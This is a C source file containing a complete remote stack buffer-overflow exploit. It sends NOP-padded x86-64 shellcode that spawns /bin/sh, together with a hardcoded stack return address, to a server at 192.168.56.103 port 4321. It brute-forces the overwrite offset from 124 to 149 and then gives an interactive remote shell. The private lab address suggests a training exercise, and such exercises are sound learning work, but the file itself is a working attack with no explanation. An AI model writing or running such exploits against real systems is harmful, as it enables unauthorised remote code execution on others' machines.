#include <sys/types.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
#include <netdb.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <errno.h>
#include <pthread.h>

#include <stdbool.h>
#define MAX 512




void *fd_write(void* sockfd){
    int wfd=*(int *) sockfd;
    int first=1;
    int n;
    for (;;) {
        if (first){
            sleep(1);
            first=0;
        }
        char buff[MAX];

        bzero(buff, sizeof(buff));
        n = 0;
        printf("Enter you command please here : ");
        fflush(stdout);
        while ((buff[n++] = getchar()) != '\n')
            ;
        
        write(wfd, buff, sizeof(buff));
        usleep(5000);
        if ((strncmp(buff, "exit", 4)) == 0) {
            printf("Client Exit...\n");
            break;
        }
    }
    return NULL;
}

void * fd_read(void* sockfd){
    int rfd=*(int *)(sockfd);
    for(;;){
        char buff[MAX];

        int n = read(rfd,buff,sizeof(buff));
        if(n==0){
            printf("End connection");
            return NULL;
        }
        printf("From Server : \n");
        printf("%s\n",buff);
        fflush(stdout);
        memset(buff,0,MAX);
    }
    return NULL;
}



int connection(int offset){
    int sockfd=0,connfd ;
    struct sockaddr_in servaddr;
    sockfd = socket(AF_INET,SOCK_STREAM,0);
    if (sockfd == -1) {
        printf("socket creation failed...\n");
        exit(0);
    }
    else
        printf("Socket successfully created..\n");
    
    bzero(&servaddr,sizeof(servaddr));
    servaddr.sin_family =AF_INET;
    servaddr.sin_addr.s_addr=inet_addr("192.168.56.103");
    servaddr.sin_port=htons(4321);
    if(connect(sockfd,(const struct sockaddr *)&servaddr,sizeof(servaddr))!=0){
        printf("connection with the server failed...\n");
        exit(0);
    }else{
        printf("connected to the server...\n");
    }
    char msg[256];
    char * head_msg = msg;
    memset(msg,0x90,256);

    char shellcode[30]={0x48, 0x31, 0xd2, 0x48, 0xbb, 0x2f, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x48, 0xc1, 0xeb, 0x08, 0x53, 0x48, 0x89, 0xe7, 0x50, 0x57, 0x48, 0x89, 0xe6, 0xb0, 0x3b, 0x0f, 0x05};
    int size_sc = 30;
    char ret_addr[6]={0xf0,0xe5,0xff,0xff,0xff,0x7f};
    // long ret_addr=0x7fffffffe5f0;
    memcpy(msg,shellcode,size_sc);
    memcpy(msg+offset,ret_addr,6);
    *(head_msg+offset+6) = 0x00; // make msg a string
    
    
    write(sockfd, msg, sizeof(msg));
    puts("msg sent\n");
    pthread_t read_fd, write_fd;
    int read_ret;
    pthread_create(&write_fd,NULL,fd_write,(void *)&sockfd);
    pthread_create(&read_fd,NULL,fd_read,(void *)&sockfd);
    pthread_join(read_fd,NULL);
    pthread_cancel(write_fd);
    close(sockfd);
    puts("");
    return 0;
}



int main(){
    // connection(140);
    //128+8-12=124
    for(int offset=124;offset<150;offset++){
        printf("offset = %d\n",offset);
        connection(offset);
        sleep(1);
    }
    return 0;
}